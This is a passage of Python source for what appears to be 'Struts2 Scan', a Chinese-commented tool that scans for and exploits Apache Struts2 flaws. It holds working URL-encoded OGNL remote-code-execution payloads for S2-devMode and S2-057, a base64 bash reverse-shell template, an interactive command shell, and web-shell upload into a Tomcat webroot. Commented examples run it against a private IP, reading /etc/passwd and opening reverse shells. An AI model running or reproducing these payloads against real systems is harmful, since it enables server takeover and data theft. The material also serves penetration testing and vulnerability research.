    exec_payload = "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command={cmd}"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-devMode'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = get(self.url + self.web_path, self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        html = get_stream(self.url + self.exec_payload.format(cmd=quote(cmd)), self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_057:
    """S2-057漏洞检测利用类"""
    info = "[+] S2-057:影响版本Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16; GET请求发送数据; 支持任意命令执行和反弹shell"
    check_poc = "%24%7BNUM1%2BNUM2%7D"
    exec_payload1 = "%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D"
    exec_payload2 = "%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
    exec_payload3 = "%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
    exec_payload4 = "%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if url.endswith(".action"):
            rindex = url.rindex('/')
            self.url = url[:rindex + 1]
            self.name = url[rindex + 1:]
        elif url.endswith("/"):
            self.url = url
            self.name = "index.action"
        else:
            self.url = url + '/'
            self.name = "index.action"
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.replace("NUM1", str(num1)).replace("NUM2", str(num2))
        url = self.url + poc + "/" + self.name
        html = get_302(url, self.headers, self.encoding)
        if str(html).startswith("ERROR:"):
            return html
        if str(num1 + num2) in html:
            self.is_vul = True
            return 'S2-057'
        return self.is_vul

    def choice_exp(self):
        """选择可用的exp"""
        payloads = [self.exec_payload1, self.exec_payload2, self.exec_payload3, self.exec_payload4]
        hash_str = get_hash()
        for exp in payloads:
            payload = exp.format(cmd=quote("echo " + hash_str))
            url = self.url + payload + "/" + self.name
            html = get_302(url, self.headers, self.encoding)
            if hash_str in html:
                return exp
        return "ERROR: 无可用Payload!"

    def exec_cmd(self, cmd):
        """执行命令"""
        exp = self.choice_exp()
        if exp.startswith('ERROR:'):
            return exp

        payload = exp.format(cmd=quote(cmd))
        url = self.url + payload + "/" + self.name
        html = get_302(url, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


# 所有漏洞名称
s2_dict = {'S2_001': S2_001, 'S2_003': S2_003, 'S2_005': S2_005, 'S2_007': S2_007, 'S2_008': S2_008, 'S2_009': S2_009,
           'S2_012': S2_012, 'S2_013': S2_013, 'S2_015': S2_015, 'S2_016': S2_016, 'S2_019': S2_019, 'S2_029': S2_029,
           'S2_032': S2_032, 'S2_033': S2_033, 'S2_037': S2_037, 'S2_045': S2_045, 'S2_046': S2_046, 'S2_048': S2_048,
           'S2_052': S2_052, 'S2_053': S2_053, 'S2_devMode': S2_devMode, "S2_057": S2_057}
# S2-052不支持漏洞扫描和检查
s2_list = [S2_001, S2_003, S2_005, S2_007, S2_008, S2_009, S2_012, S2_013, S2_015, S2_016, S2_019,
           S2_029, S2_032, S2_033, S2_037, S2_045, S2_046, S2_048, S2_053, S2_devMode, S2_057]
# 支持获取WEB路径的漏洞名称列表
webpath_names = ["S2_001", "S2_005", "S2_013", "S2_016", "S2_019", "S2_032", "S2_037", "S2_045", "S2_046", "S2_devMode"]
# 支持命令执行的漏洞名称列表
exec_names = ["S2_001", "S2_003", "S2_005", "S2_007", "S2_008", "S2_009", "S2_013", "S2_015", "S2_016", "S2_019",
              "S2_029", "S2_032", "S2_033", "S2_037", "S2_045", "S2_046", "S2_048", "S2_052", "S2_052", "S2_devMode",
              "S2_057"]
# 支持反弹shell的漏洞名称列表
reverse_names = ["S2_001", "S2_007", "S2_008", "S2_009", "S2_013", "S2_015", "S2_016", "S2_019", "S2_029", "S2_032",
                 "S2_033", "S2_037", "S2_045", "S2_046", "S2_048", "S2_052", "S2_052", "S2_devMode", "S2_057"]
# 支持文件上传的漏洞名称列表
upload_names = ["S2_013", "S2_016", "S2_019", "S2_045", "S2_046"]

banner = """
 ____  _              _       ____    ____                  
/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __| __) | \___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|

                                      Author By HatBoy        
"""


def show_info():
    """漏洞详情介绍"""
    click.secho("[+] 支持如下Struts2漏洞:", fg='red')
    for k, v in s2_dict.items():
        click.secho(v.info, fg='green')


def check_one(s):
    """检测单个漏洞"""
    result = s.check()
    return result


def scan_one(url, data=None, headers=None, encoding="UTF-8"):
    """扫描单个URL漏洞"""
    click.secho('[+] 正在扫描URL:' + url, fg='green')
    ss = [s(url, data, headers, encoding) for s in s2_list]
    with futures.ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(check_one, ss))
    results = {r for r in results if r}
    click.secho('[*] ----------------results------------------'.format(url=url), fg='green')
    if (not results) and (not is_quiet):
        click.secho('[*] {url} 未发现漏洞'.format(url=url), fg='red')
    for r in results:
        if r.startswith("ERROR:"):
            click.secho('[ERROR] {url} 访问出错: {error}'.format(url=url, error=r[6:]), fg='red')
        else:
            click.secho('[*] {url} 存在漏洞: {name}'.format(url=url, name=r), fg='red')


def scan_more(urls, data=None, headers=None, encoding="UTF-8"):
    """批量扫描URL"""
    scan = partial(scan_one, data=data, headers=headers, encoding=encoding)
    with futures.ProcessPoolExecutor(max_workers=process) as executor:
        results = list(executor.map(scan, urls))


CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])


@click.command(context_settings=CONTEXT_SETTINGS)
@click.option('-i', '--info', is_flag=True, help="漏洞信息介绍")
@click.option('-v', '--version', is_flag=True, help="显示工具版本")
@click.option('-u', '--url', help="URL地址")
@click.option('-n', '--name', help="指定漏洞名称, 漏洞名称详见info")
@click.option('-f', '--file', help="批量扫描URL文件, 一行一个URL")
@click.option('-d', '--data', help="POST参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp}")
@click.option('-c', '--encode', default="UTF-8", help="页面编码, 默认UTF-8编码")
@click.option('-p', '--proxy', help="HTTP代理. 格式为http://ip:port")
@click.option('-t', '--timeout', help="HTTP超时时间, 默认10s")
@click.option('-w', '--workers', help="批量扫描进程数, 默认为10个进程")
@click.option('--header', help="HTTP请求头, 格式为: key1=value1&key2=value2")
@click.option('-e', '--exec', is_flag=True, help="进入命令执行shell")
@click.option('--webpath', is_flag=True, help="获取WEB路径")
@click.option('-r', '--reverse', help="反弹shell地址, 格式为ip:port")
@click.option('--upfile', help="需要上传的文件路径和名称")
@click.option('--uppath', help="上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp")
@click.option('-q', '--quiet', is_flag=True, help="关闭打印不存在漏洞的输出，只保留存在漏洞的输出")
def main(info, version, url, file, name, data, header, encode, proxy, exec, reverse, upfile, uppath, quiet, timeout,
         workers, webpath):
    """Struts2批量扫描利用工具"""
    global proxies, is_quiet, _tiemout, process
    click.secho(banner, fg='red')
    if not encode:
        encode = 'UTF-8'
    if info:
        show_info()
        exit(0)
    if version:
        click.secho("[+] Struts2 Scan V0.1", fg='green')
        exit(0)
    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy
        }
    if quiet:
        is_quiet = True
    if timeout and check_int('timeout', timeout):
        _tiemout = check_int('timeout', timeout)
    if workers and check_int('workers', workers):
        process = check_int('workers', workers)
    if url and not name:
        scan_one(url, data, header, encode)
    if file:
        urls = read_urls(file)
        scan_more(urls, data, header, encode)
    if name and url:
        # 指定漏洞利用
        name = name.upper().replace('-', '_')
        if name not in s2_list:
            click.secho("[ERROR] 暂不支持{name}漏洞利用".format(name=name), fg="red")
            exit(0)
        s = s2_dict[name](url, data, header, encode)
        s.check()
        if not s.is_vul:
            click.secho("[ERROR] 该URL不存在{name}漏洞".format(name=name), fg="red")
        if webpath:
            if name in webpath_names:
                web_path = s.get_path()
                click.secho("[*] {webpath}".format(webpath=web_path), fg="red")
                exit(0)
            else:
                click.secho("[ERROR] 漏洞{name}不支持获取WEB路径".format(name=name), fg="red")
                exit(0)
        if reverse:
            if name in reverse_names:
                click.secho("[*] 请在反弹地址处监听端口如: nc -lvvp 8080", fg="red")
                if ':' not in reverse:
                    click.secho("[ERROR] reverse反弹地址格式不对,正确格式为: 192.168.1.10:8080", fg="red")
                ip = reverse.split(':')[0].strip()
                port = reverse.split(':')[1].strip()
                s.reverse_shell(ip, port)
                exit(0)
            else:
                click.secho("[ERROR] 漏洞{name}不支持反弹shell".format(name=name), fg="red")
                exit(0)
        if upfile and uppath:
            if name in upload_names and check_file(upfile):
                result = s.upload_shell(uppath, upfile)
                if result is True:
                    click.secho("[+] 文件上传成功!", fg="green")
                    exit(0)
                elif str(result).startswith("ERROR:"):
                    click.secho("[ERROR] 文件上传失败! {error}".format(error=result[6:]), fg="red")
                    exit(0)
                else:
                    click.secho("[ERROR] 文件上传失败! \n{error}".format(error=result), fg="red")
                    exit(0)
            else:
                click.secho("[ERROR] 漏洞{name}不支持文件上传".format(name=name), fg="red")
                exit(0)
        if exec:
            if name in exec_names:
                if name == "S2_052":
                    click.secho("[+] 提示: S2_052命令执行无回显，可将结果写入文件访问", fg='red')
                while True:
                    cmd = input('>>>')
                    result = s.exec_cmd(cmd)
                    click.secho(result, fg='red')
            else:
                click.secho("[ERROR] 漏洞{name}不支持命令执行".format(name=name), fg="red")
                exit(0)
        click.secho(s.info, fg='green')
        exit(0)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt as e:
        exit(0)
    except Exception as e:
        click.secho("[ERROR] {error}".format(error=e), fg='red')
        exit(0)

# s = S2_001("http://192.168.100.8:8080/login.action")
# print(s.info)
# print(s.check())
# print(s.get_path())
# print(s.exec_cmd('ls -al'))
# s.reverse_shell('192.168.100.8', '8888')


# s =  S2_003("http://192.168.100.8:8080/showcase.action")
# print(s.check())
# print(s.exec_cmd('ls -la'))

# s = S2_005("http://192.168.100.8:8080/example/HelloWorld.action")
# print(s.check())
# print(s.get_path())
# print(s.exec_cmd('ls -al'))


# s = S2_007("http://192.168.100.8:8080/user.action", "name=admin&email=admin&age={exp}")
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')

# s = S2_008("http://192.168.100.8:8080")
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')

# s = S2_009("http://192.168.100.8:8080/ajax/example5.action?age=123", "name")
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')

# s = S2_012("http://192.168.100.8:8080/S2-012/user.action?name=")
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')

# s = S2_013("http://192.168.100.8:8080/S2-013/link.action")
# s.check()
# print(s.get_path())
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')
# print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))

# s = S2_015("http://192.168.100.8:8080/param.action")
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')

# s = S2_016("http://192.168.100.8:8080/index.action")
# s.check()
# print(s.get_path())
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')
# print(s.exec_cmd1('ls -la'))
# print('---------------------')
# print(s.exec_cmd2('ls -la'))
# print('---------------------')
# print(s.exec_cmd3('ls -la'))
# print(s.upload_shell1('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))
# print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))


# s = S2_019("http://192.168.100.8:8080/example/HelloWorld.action")
# print(s.get_path())
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')
# print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))


# s = S2_029("http://192.168.100.8/default.action")
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')


# s = S2_032("http://192.168.100.8:8080/index.action")
# s.check()
# print(s.exec_cmd('ls -la'))
# print(s.get_path())
# s.reverse_shell('192.168.100.8', '8888')


# s = S2_033("http://192.168.100.8/orders/3")
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')


# s = S2_037("http://192.168.100.8:8080/orders/3/")
# s.check()
# print(s.exec_cmd('ls -la'))
# print(s.get_path())
# s.reverse_shell('192.168.100.8', '8888')


# s = S2_045("http://192.168.100.8/memoshow.action")
# s.check()
# print(s.get_path())
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')
# print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))


# s = S2_046("http://192.168.100.8/doUpload.action")
# s.check()
# print(s.get_path())
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')
# print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))

# s = S2_052('http://192.168.100.8/orders/3/edit')
# s.reverse_shell('192.168.100.8', '8888')

# s = S2_048("http://192.168.100.8/integration/saveGangster.action", data='name={exp}&age=123&__checkbox_bustedBefore=true&description=123')
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')

# s = S2_048("http://192.168.100.8/integration/saveGangster.action", data='name={exp}&age=123&__checkbox_bustedBefore=true&description=123')
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')

# s = S2_053("http://192.168.100.8", data='name={exp}')
# s.check()
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')

# s = S2_devMode("http://192.168.100.8/orders")
# print(s.get_path())
# print(s.exec_cmd('ls -la'))
# s.reverse_shell('192.168.100.8', '8888')

# s = S2_057("http://192.168.100.8:8080/showcase/actionChain1.action")
# print(s.check())
# print(s.exec_cmd("cat /etc/passwd"))
# s.reverse_shell("192.168.100.8", 9999)
